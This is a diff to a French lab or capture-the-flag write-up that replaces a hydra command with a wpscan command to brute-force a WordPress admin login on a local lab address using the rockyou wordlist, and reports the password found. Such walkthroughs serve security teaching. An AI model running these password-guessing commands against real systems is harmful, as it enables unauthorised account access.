@@ -178,13 +178,13 @@ passwd marlinspike
 
 ![Site web](./image/site_web_login.png)
 
-> En cherchant sur internet on peut découvrir que le login par défaut est admin. Nous allons donc utiliser hydra pour trouver le mot de passe.
+> En cherchant sur internet on peut découvrir que le login par défaut est admin. Nous allons donc utiliser wpscan pour trouver le mot de passe.
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr http-get://192.168.56.102/secret/wp-admin -V
+wpscan --url http://192.168.56.102/secret/wp-admin -U admin -P /usr/share/wordlists/rockyou.txt
 ```
 
-**Hydra nous a trouver le mot de passe du compte admin: admin**
+**Wpscan nous a trouver le mot de passe du compte admin: admin**
 
 ### 4.2. Atteinte de l'objectif 4
 *Rappel: L'attaquant peut-il modifier le contenu du site web ?*
